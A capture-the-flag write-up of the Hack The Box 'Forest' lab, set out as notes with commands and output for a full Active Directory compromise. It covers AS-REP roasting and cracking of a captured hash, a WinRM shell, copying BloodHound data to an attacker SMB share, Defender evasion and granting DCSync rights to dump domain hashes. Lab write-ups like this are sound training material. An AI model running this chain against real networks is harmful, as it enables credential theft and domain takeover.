# Recon
```
└─$ nmap -sC -sV 10.10.10.161    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-05 23:56 EEST
Stats: 0:00:30 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 23:56 (0:00:00 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 27.27% done; ETC: 23:57 (0:00:16 remaining)
Nmap scan report for 10.10.10.161
Host is up (0.18s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-05 20:03:58Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h26m56s, deviation: 4h02m30s, median: -53m04s
| smb2-time: 
|   date: 2023-08-05T20:04:07
|_  start_date: 2023-08-05T18:22:35
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-08-05T13:04:08-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.86 seconds

```
- notice TCP/5985, which means if I can find credentials for a user, I might be able to get a an get a shell over WinRM
- we know domain is htb.local from nmap 
- we try port 53 with dig  @10.10.10.161 htb.local but no luck also
- Neither smbmap nor smbclient will allow me to list shares without a password
- RPC - TCP 445
```
rpcclient -U "" -N 10.10.10.161
```
- get a list of users with enumdomusers
```
─$ rpcclient -U "" -N 10.10.10.161                     
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
- list the groups as well with enumdomgroups
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
```
- I have a list of accounts from my RPC enumeration above. I’ll start without the SM* or HealthMailbox* accounts
```
─$ cat users.txt
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco  
```
- use the Impacket tool GetNPUsers.py to try to get a hash for each user, and I find one for the svc-alfresco account
 ```
 for user in $(cat users); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:7d06e635b0cb7138687d07f29a62982b$619acf894e16cd1ae0d57dd8141e959877c40de6017951af9d4a184a95206178b9ce3472ac9ba50fce4ab1ec5e6c2d0c7bc858bb787821b104e46f71840a0fb21b690901628f465dd6019362b56de9299930a5bddb2ffcc1aa790751f29b996c11375088d119aceb8f8aa6cb5d879289ba3af46b02303f2fced38f2b3d68095db642b8d4a49ac4520479402e4c938a9ec5eb8a87704e667e17061675af6ff0d2099d4b66eb39fbd0e6fb2d96be81707915eb055eff3cad1b1933dee6ad7f32b86c8ad93e78adf99b30193eb286a611c717653609359fdde08c85569ff7c0ba86
 ```
- use hashcat to break the hash
```
hashcat -m 18200 svc.kerb /usr/share/wordlists/rockyou.txt --force
```
- hashcat gave password s3rvice
- now try evilwinrm with these creds and we got a shell we see its port open whuch is 5985
# Privilage Escalation
- run SharpHound to collect data for BloodHound upload it with
```

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> upload SharpHound.exe
                                        
Info: Uploading /home/kali/BloodHound/Collectors/SharpHound.exe to C:\Users\svc-alfresco\appdata\local\temp\SharpHound.exe
                                        
Data: 1395368 bytes of 1395368 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> ./SharpHound.exe -c all
2023-08-05T17:42:03.2895403-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-08-05T17:42:03.4770686-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-08-05T17:42:03.4926804-07:00|INFORMATION|Initializing SharpHound at 5:42 PM on 8/5/2023
2023-08-05T17:42:03.8832903-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2023-08-05T17:42:04.0395347-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-08-05T17:42:04.3520382-07:00|INFORMATION|Beginning LDAP search for htb.local
2023-08-05T17:42:04.4301627-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-08-05T17:42:04.4301627-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-08-05T17:42:34.5708606-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 41 MB RAM
2023-08-05T17:42:47.2427517-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-08-05T17:42:47.2896313-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-08-05T17:42:47.4458809-07:00|INFORMATION|Status: 161 objects finished (+161 3.744186)/s -- Using 48 MB RAM
2023-08-05T17:42:47.4458809-07:00|INFORMATION|Enumeration finished in 00:00:43.1046565
2023-08-05T17:42:47.5708801-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-08-05T17:42:47.5865083-07:00|INFORMATION|SharpHound Enumeration Completed at 5:42 PM on 8/5/2023! Happy Graphing!
```
- use smbserver.py to exfil the results
```
impacket-smbserver share . -smb2support -username df -password df
```
- now on the forest
```
net use \\10.10.16.5\share /u:df df
copy 20230805174246_BloodHound.zip \\10.10.16.5\share\
```
- There should be JSON files outputted in the folder, which can be uploaded to the bloodhound GUI. Search for the svc-alfresco user and mark it as owned. - Double clicking on the node should display it's properties on the right. It's found that svc-alfresco is a member of nine groups
through nested membership. Click on 9 to reveal the membership graph.
- found Account Operators , which is a privileged AD group
- members of the Account Operators group are allowed create and modify users and add them to non-protected groups. Let's note this and look at the paths to Domain Admins. Click on Queries and select Shortest Path to High Value targets
- One of the paths shows that the Exchange Windows Permissions group has WriteDacl privileges on the Domain
- The WriteDACL privilege gives a user the ability to add ACLs to an object
- This means that we can add a user to this group and give them DCSync privileges
- add a new user to Exchange Windows Permissions as well as the Remote Management Users group.
- ```
  *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net user islam iso12345 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> net group "Exchange Windows Permissions" islam /add /domain
The command completed successfully.

  ```
- download the PowerView script and import it into the current session
```
. ./Powerview.ps1
```
- The Bypass-4MSI command is used to evade defender before importing the script
-  Next, we can use the Add-ObjectACL with islam's credentials, and give him DCSync rights
```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $SecPassword = ConvertTo-SecureString 'iso12345' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> $Cred = New-Object System.Management.Automation.PSCredential('htb\islam', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> Add-ObjectAcl -PrincipalIdentity islam -Credential $Cred -TargetIdentity htb.local -Rights DCSync
```
- run secretsdump.py  script from Impacket can now be run as islam, and used to reveal the NTLM hashes for all domain users
